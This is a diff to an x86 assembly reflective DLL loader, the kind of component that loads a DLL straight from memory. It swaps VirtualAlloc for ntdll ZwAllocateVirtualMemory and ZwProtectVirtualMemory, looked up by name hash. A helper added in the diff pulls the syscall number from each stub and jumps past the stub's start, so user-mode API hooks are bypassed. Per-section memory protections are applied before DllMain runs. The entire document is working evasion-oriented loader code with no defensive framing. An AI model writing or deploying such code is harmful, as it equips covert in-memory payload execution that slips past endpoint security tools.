@@ -16,7 +16,8 @@ KERNEL32DLL_HASH            EQU 0x6A4ABC5B
 NTDLLDLL_HASH               EQU 0x3CFA685D
 LOADLIBRARYA_HASH           EQU 0xEC0E4E8E
 GETPROCADDRESS_HASH         EQU 0x7C0DFCAA
-VIRTUALALLOC_HASH           EQU 0x91AFCA54
+ZWALLOCATEVIRTUALMEMORY_HASH EQU 0xD33D4AED
+ZWPROTECTVIRTUALMEMORY_HASH EQU 0xBC3F4D89
 NTFLUSHINSTRUCTIONCACHE_HASH EQU 0x534C0AB8
 
 ; PE / reloc constants
@@ -35,7 +36,7 @@ DLL_PROCESS_ATTACH          EQU 1
 ; Stack frame layout (ebp-based, 4-byte slots)
 ;   [ebp - 4 ]  = pLoadLibraryA
 ;   [ebp - 8 ]  = pGetProcAddress
-;   [ebp - 12]  = pVirtualAlloc
+;   [ebp - 12]  = pZwAllocateVirtualMemory
 ;   [ebp - 16]  = pNtFlushInstructionCache
 ;   [ebp - 20]  = uiLibraryAddress  (source image base / later delta)
 ;   [ebp - 24]  = uiBaseAddress     (new alloc / module base during walk)
@@ -51,10 +52,11 @@ DLL_PROCESS_ATTACH          EQU 1
 ;   [ebp - 64]  = uiValueE          (loaded library base / reloc page base)
 ;   [ebp - 68]  = usCounter
 ;   [ebp - 72]  = dwHashValue
+;   [ebp - 76]  = pZwProtectVirtualMemory
 ; ---------------------------------------------------------------------------
 %define pLoadLibraryA           dword [ebp -  4]
 %define pGetProcAddress         dword [ebp -  8]
-%define pVirtualAlloc           dword [ebp - 12]
+%define pZwAllocateVirtualMemory dword [ebp - 12]
 %define pNtFlushInstructionCache dword [ebp - 16]
 %define uiLibraryAddress        dword [ebp - 20]
 %define uiBaseAddress           dword [ebp - 24]
@@ -70,6 +72,7 @@ DLL_PROCESS_ATTACH          EQU 1
 %define uiValueE                dword [ebp - 64]
 %define usCounter               dword [ebp - 68]
 %define dwHashValue             dword [ebp - 72]
+%define pZwProtectVirtualMemory  dword [ebp - 76]
 
 ; ============================================================================
 ; Entry: ReflectiveLoader()
@@ -80,7 +83,7 @@ ReflectiveLoader:
     ; ---- prologue -----------------------------------------------------------
     push    ebp
     mov     ebp, esp
-    sub     esp, 76                    ; 72 bytes locals + 4 alignment
+    sub     esp, 80                    ; 76 bytes locals + 4 alignment
     push    ebx
     push    esi
     push    edi
@@ -89,8 +92,9 @@ ReflectiveLoader:
     xor     eax, eax
     mov     pLoadLibraryA, eax
     mov     pGetProcAddress, eax
-    mov     pVirtualAlloc, eax
+    mov     pZwAllocateVirtualMemory, eax
     mov     pNtFlushInstructionCache, eax
+    mov     pZwProtectVirtualMemory, eax
 
     ; disable base address parameter — compatible with standard reflective loader
     xor     ecx, ecx
@@ -174,14 +178,14 @@ ReflectiveLoader:
     jmp     .next_module
 
     ; ------------------------------------------------------------------
-    ; process_kernel32: find LoadLibraryA, GetProcAddress, VirtualAlloc
+    ; process_kernel32: find LoadLibraryA, GetProcAddress
     ; ------------------------------------------------------------------
 .process_kernel32:
     mov     eax, uiValueA
     mov     esi, [eax + 0x10]         ; DllBase
     mov     uiBaseAddress, esi
     call    .get_export_info           ; sets uiExportDir, uiNameArray, uiNameOrdinals, uiValueC
-    mov     usCounter, 3
+    mov     usCounter, 2               ; we want 2 functions
 
 .k32_export_loop:
     ; bounds check
@@ -202,8 +206,6 @@ ReflectiveLoader:
     je      .k32_store_func
     cmp     eax, GETPROCADDRESS_HASH
     je      .k32_store_func
-    cmp     eax, VIRTUALALLOC_HASH
-    je      .k32_store_func
     jmp     .k32_next_export
 
 .k32_store_func:
@@ -222,12 +224,7 @@ ReflectiveLoader:
     mov     pLoadLibraryA, edx
     jmp     .k32_dec_counter
 .k32_try_gpa:
-    cmp     eax, GETPROCADDRESS_HASH
-    jne     .k32_try_va
     mov     pGetProcAddress, edx
-    jmp     .k32_dec_counter
-.k32_try_va:
-    mov     pVirtualAlloc, edx
 .k32_dec_counter:
     mov     eax, usCounter
     dec     eax
@@ -241,14 +238,15 @@ ReflectiveLoader:
     jmp     .k32_export_loop
 
     ; ------------------------------------------------------------------
-    ; process_ntdll: find NtFlushInstructionCache
+    ; process_ntdll: find NtFlushInstructionCache, ZwAllocateVirtualMemory,
+    ;                      ZwProtectVirtualMemory
     ; ------------------------------------------------------------------
 .process_ntdll:
     mov     eax, uiValueA
     mov     esi, [eax + 0x10]         ; DllBase
     mov     uiBaseAddress, esi
     call    .get_export_info
-    mov     usCounter, 1
+    mov     usCounter, 3               ; we want 3 functions
 
 .ntdll_export_loop:
     ; bounds check
@@ -262,9 +260,17 @@ ReflectiveLoader:
     mov     ecx, [ecx]
     add     ecx, uiBaseAddress
     call    .hash_funcname
-    cmp     eax, NTFLUSHINSTRUCTIONCACHE_HASH
-    jne     .ntdll_next
+    mov     dwHashValue, eax
 
+    cmp     eax, NTFLUSHINSTRUCTIONCACHE_HASH
+    je      .ntdll_store_func
+    cmp     eax, ZWALLOCATEVIRTUALMEMORY_HASH
+    je      .ntdll_store_func
+    cmp     eax, ZWPROTECTVIRTUALMEMORY_HASH
+    je      .ntdll_store_func
+    jmp     .ntdll_next
+
+.ntdll_store_func:
     mov     edx, uiExportDir
     mov     edx, [edx + 0x1C]
     add     edx, uiBaseAddress
@@ -272,8 +278,25 @@ ReflectiveLoader:
     movzx   ecx, word [ecx]
     mov     edx, [edx + ecx*4]
     add     edx, uiBaseAddress
+
+    mov     eax, dwHashValue
+    cmp     eax, NTFLUSHINSTRUCTIONCACHE_HASH
+    jne     .ntdll_try_zw
     mov     pNtFlushInstructionCache, edx
-    jmp     .check_all_found
+    jmp     .ntdll_dec_counter
+.ntdll_try_zw:
+    cmp     eax, ZWALLOCATEVIRTUALMEMORY_HASH
+    jne     .ntdll_try_zw_prot
+    mov     pZwAllocateVirtualMemory, edx
+    jmp     .ntdll_dec_counter
+.ntdll_try_zw_prot:
+    mov     pZwProtectVirtualMemory, edx
+.ntdll_dec_counter:
+    mov     eax, usCounter
+    dec     eax
+    mov     usCounter, eax
+    test    eax, eax
+    jz      .check_all_found
 
 .ntdll_next:
     add     uiNameArray, 4
@@ -285,7 +308,9 @@ ReflectiveLoader:
     jz      .next_module
     cmp     pGetProcAddress, 0
     jz      .next_module
-    cmp     pVirtualAlloc, 0
+    cmp     pZwAllocateVirtualMemory, 0
+    jz      .next_module
+    cmp     pZwProtectVirtualMemory, 0
     jz      .next_module
     cmp     pNtFlushInstructionCache, 0
     jnz     .step2
@@ -296,7 +321,7 @@ ReflectiveLoader:
     jmp     .walk_modules
 
     ; =========================================================================
-    ; STEP 2: VirtualAlloc a new region and copy headers
+    ; STEP 2: ZwAllocateVirtualMemory a new region and copy headers
     ; =========================================================================
 .step2:
     mov     ecx, uiLibraryAddress
@@ -304,18 +329,27 @@ ReflectiveLoader:
     add     eax, ecx                   ; eax = NT headers VA
     mov     uiHeaderValue, eax
 
-    ; PE32 OptionalHeader layout (from NT header base):
-    ;   SizeOfImage    = NT + 0x50  (OptHdr+0x38)
-    ;   SizeOfHeaders  = NT + 0x54  (OptHdr+0x3C)
-    ;   ImageBase      = NT + 0x34  (OptHdr+0x1C)
-    ;   DataDirectory  = NT + 0x78  (OptHdr+0x60)
-
-    ; VirtualAlloc(NULL, SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-    push    PAGE_EXECUTE_READWRITE
-    push    MEM_RESERVE | MEM_COMMIT
-    push    dword [eax + 0x50]         ; SizeOfImage
-    push    0                          ; lpAddress = NULL
-    call    pVirtualAlloc              ; stdcall, callee cleans 16 bytes
+    ; ZwAllocateVirtualMemory(-1, &BaseAddress, 0, &RegionSize,
+    ;                         MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+    ; SizeOfImage at NT + 0x50
+    sub     esp, 8
+    mov     dword [esp], 0             ; local BaseAddress = NULL
+    mov     edx, uiHeaderValue
+    mov     edx, [edx + 0x50]         ; SizeOfImage
+    mov     [esp + 4], edx             ; local RegionSize = SizeOfImage
+    ; push args right-to-left (stdcall)
+    push    PAGE_EXECUTE_READWRITE     ; arg6: Protect
+    push    MEM_RESERVE | MEM_COMMIT   ; arg5: AllocationType
+    lea     eax, [esp + 12]            ; &RegionSize
+    push    eax                        ; arg4: pRegionSize
+    push    0                          ; arg3: ZeroBits = 0
+    lea     eax, [esp + 16]            ; &BaseAddress
+    push    eax                        ; arg2: pBaseAddress
+    push    -1                         ; arg1: ProcessHandle = current process
+    mov     edx, pZwAllocateVirtualMemory
+    call    .direct_syscall            ; stdcall, callee cleans 24 bytes
+    mov     eax, [esp]                 ; retrieve allocated BaseAddress
+    add     esp, 8                     ; free locals
     mov     uiBaseAddress, eax
 
     ; copy headers
@@ -504,9 +538,83 @@ ReflectiveLoader:
     jmp     .reloc_block_loop
 
     ; =========================================================================
-    ; STEP 6: call DllMain(hinstDLL, DLL_PROCESS_ATTACH, NULL)
+    ; STEP 6: set correct memory protections per section
     ; =========================================================================
 .step6:
+    ; re-derive NT header
+    mov     ecx, uiBaseAddress
+    mov     eax, [ecx + 0x3C]
+    add     eax, ecx                   ; eax = NT headers VA
+    mov     uiHeaderValue, eax
+
+    ; walk section headers
+    movzx   ecx, word [eax + 0x14]    ; SizeOfOptionalHeader
+    lea     ecx, [eax + 0x18 + ecx]   ; first IMAGE_SECTION_HEADER
+    mov     uiValueD, ecx             ; save section pointer
+    movzx   eax, word [eax + 0x06]    ; NumberOfSections
+    mov     uiValueB, eax
+
+.protect_section_loop:
+    cmp     uiValueB, 0
+    jz      .step7
+
+    mov     ebx, uiValueD              ; ebx = current section header
+
+    ; skip if VirtualSize is 0
+    mov     eax, [ebx + 0x08]         ; VirtualSize
+    test    eax, eax
+    jz      .protect_next_section
+
+    ; derive protection from Characteristics (offset 0x24)
+    ; bits: 29=EXECUTE, 30=READ, 31=WRITE -> shift to bits 0,1,2
+    mov     eax, [ebx + 0x24]         ; Characteristics
+    shr     eax, 29
+    and     eax, 0x7                   ; 3-bit index: XRW
+
+    ; PIC-safe lookup of protection table
+    call    .prot_delta
+.prot_delta:
+    pop     ecx                        ; ecx = runtime address of .prot_delta
+    movzx   esi, byte [ecx + (.prot_table - .prot_delta) + eax]
+    jmp     .do_protect
+.prot_table:
+    ;       ---   X     R     XR    W     XW    RW    XRW
+    db      0x01, 0x10, 0x02, 0x20, 0x04, 0x40, 0x04, 0x40
+.do_protect:
+    ; esi = NewProtect
+
+    ; ZwProtectVirtualMemory(-1, &BaseAddr, &RegionSize, NewProtect, &OldProtect)
+    sub     esp, 12                    ; locals: BaseAddr(4), RegionSize(4), OldProtect(4)
+    ; local BaseAddress = uiBaseAddress + section.VirtualAddress
+    mov     eax, [ebx + 0x0C]         ; section VirtualAddress RVA
+    add     eax, uiBaseAddress
+    mov     [esp], eax                 ; local BaseAddress
+    ; local RegionSize = section.VirtualSize
+    mov     eax, [ebx + 0x08]         ; VirtualSize
+    mov     [esp + 4], eax            ; local RegionSize
+    mov     dword [esp + 8], 0        ; local OldProtect = 0
+    ; push args right-to-left
+    lea     eax, [esp + 8]
+    push    eax                        ; arg5: &OldProtect
+    push    esi                        ; arg4: NewProtect
+    lea     eax, [esp + 12]
+    push    eax                        ; arg3: &RegionSize
+    lea     eax, [esp + 12]
+    push    eax                        ; arg2: &BaseAddress
+    push    -1                         ; arg1: ProcessHandle = current process
+    mov     edx, pZwProtectVirtualMemory
+    call    .direct_syscall            ; stdcall, callee cleans 20 bytes
+    add     esp, 12                    ; free locals
+
+.protect_next_section:
+    add     uiValueD, 40              ; next section header
+    dec     uiValueB
+    jmp     .protect_section_loop
+
+    ; =========================================================================
+    ; STEP 7: call DllMain(hinstDLL, DLL_PROCESS_ATTACH, NULL)
+    ; =========================================================================
+.step7:
     ; re-derive NT header (may have been clobbered)
     mov     ecx, uiBaseAddress
     mov     eax, [ecx + 0x3C]
@@ -539,6 +647,18 @@ ReflectiveLoader:
     mov     esp, ebp
     pop     ebp
     ret
+
+    ; =========================================================================
+    ; HELPER: .direct_syscall
+    ; IN:  edx = address of Zw/Nt function stub
+    ;      Stack has stdcall args pushed, then return address from call
+    ; Extracts the syscall number from the stub's mov eax,<num> instruction
+    ; and jumps past it into the syscall transition machinery.
+    ; =========================================================================
+.direct_syscall:
+    mov     eax, dword [edx + 1]      ; syscall number from B8 xx xx xx xx
+    lea     edx, [edx + 5]            ; past mov eax instruction
+    jmp     edx
 
     ; =========================================================================
     ; HELPER: .get_export_info
